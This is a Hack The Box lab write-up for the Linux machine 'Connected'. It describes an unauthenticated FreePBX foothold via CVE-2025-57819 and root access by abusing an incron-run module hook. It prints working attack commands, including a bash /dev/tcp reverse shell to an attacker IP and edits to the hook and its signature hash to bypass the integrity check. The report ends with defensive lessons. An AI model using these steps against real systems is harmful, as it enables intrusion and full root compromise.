Connected

Hack The Box Machine Report

Machine Info

Difficulty: Easy

Operating System: Linux

Status: Active / HTB Machine

Date Completed: 16 June 2026

Summary

Connected is a Linux machine that focuses on web enumeration, identifying a vulnerable FreePBX instance, gaining an initial foothold through a public FreePBX vulnerability, and escalating privileges by abusing writable FreePBX module hooks executed through an incron-based automation process.

Initial enumeration revealed SSH, HTTP, and HTTPS services. The web service redirected to a FreePBX administration portal running FreePBX 16.0.40.7. This version was vulnerable to CVE-2025-57819, which allowed unauthenticated access and led to remote code execution. After gaining a shell as the asterisk user, local enumeration revealed writable FreePBX hook files and an incron rule that executed hooks as root. By modifying a writable hook and updating the module signature hash, I was able to trigger the hook and escalate to root.

Vulnerability Identification

FreePBX 16.0.40.7 was below the patched FreePBX 16 endpoint version and matched the affected range for CVE-2025-57819. This vulnerability involved unauthenticated SQL injection leading to administrator access and remote code execution.

I first attempted older Metasploit FreePBX modules, but they failed because they targeted older versions or different exploit paths. After identifying the more relevant FreePBX 16 issue, I used a public Python proof of concept for CVE-2025-57819.

Initial Foothold

The exploit created an admin user through SQL injection, authenticated to the FreePBX admin panel, uploaded or created a webshell, and then triggered a reverse shell. 

python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.209 --lport 4444

Privilege Escalation

The main privilege escalation path came from abusing FreePBX's sysadmin hook mechanism. LinPEAS showed that incron was watching /var/spool/asterisk/incron and running /usr/bin/sysadmin_manager when files were modified. 

cat /etc/incron.d/sysadmin

The important rule was:

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#

Inspecting /usr/bin/sysadmin_manager showed that it processed FreePBX module hooks and executed them after validating their hashes in the module signature file. 

file /usr/bin/sysadmin_manager
```

grep -nEi "argv|system|exec|shell_exec|passthru|incron|spool|asterisk" /usr/bin/sysadmin_manager
```

The key execution sink was: 

system("$hookfile $params");

The vulnerable path was the UCP module's logrotate hook. The hook file was writable by the asterisk user, and the module signature file could also be updated. 

ls -la /var/www/html/admin/modules/ucp/hooks/
```

ls -la /var/www/html/admin/modules/ucp/module.sig
```

Root Exploitation Steps

First, I backed up the original hook.

cp /var/www/html/admin/modules/ucp/hooks/logrotate /tmp/logrotate.bak

Then I replaced the hook with a reverse shell payload.

cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'
```

#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.209/4445 0>&1"
EOF

chmod +x /var/www/html/admin/modules/ucp/hooks/logrotate
```

Because sysadmin_manager checked the hook hash, I calculated the new SHA256 hash and updated module.sig. 

NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
```

echo $NEW_HASH

sed -i "s#hooks/logrotate = .*#hooks/logrotate = $NEW_HASH#" /var/www/html/admin/modules/ucp/module.sig

grep "hooks/logrotate" /var/www/html/admin/modules/ucp/module.sig
```

On my attacker machine, I started a second listener. 

nc -lvnp 4445

Finally, I triggered the incron watcher by touching the expected module hook trigger file. 

touch /var/spool/asterisk/incron/ucp.logrotate

This caused sysadmin_manager to validate and execute the modified UCP hook as root, returning a root shell to my listener.

Vulnerabilities / Misconfiguration

The initial foothold was possible because the target was running FreePBX 16.0.40.7, which was vulnerable to CVE-2025-57819. This allowed unauthenticated SQL injection and led to remote code execution.

The privilege escalation issue came from weak file permissions combined with root-run file event automation. The asterisk user could modify a FreePBX module hook and update the matching hash in module.sig. When the incron watcher triggered sysadmin_manager, the modified hook was executed as root.

Defensive Takeaways

FreePBX should be kept fully patched, especially when administrator or endpoint-related components are exposed to a network. Administrative interfaces should be restricted to trusted networks or VPN-only access.

Local file permissions should be reviewed carefully. A low-privileged service account should not be able to modify scripts or signature files that can later be executed by root. File integrity checks are not effective if the same low-privileged user can modify both the executable file and the trusted hash source.

Root-run automation such as cron and incron should be treated as sensitive attack surface. Any watched file or directory writable by a lower-privileged user can become a privilege escalation path.

Lessons Learned

This machine reinforced the importance of version enumeration. Identifying FreePBX 16.0.40.7 was the key to finding the correct CVE and avoiding older FreePBX exploits that did not apply.

I also learned how important it is to understand Linux automation beyond normal cron jobs. In this machine, incron was the critical privilege escalation clue because it executed root-controlled actions when specific files changed.

The privilege escalation path also showed that signature validation can be bypassed if the attacker can modify both the checked file and the signature/hash record. This was a useful lesson in why permissions and trust boundaries matter as much as the validation logic itself.
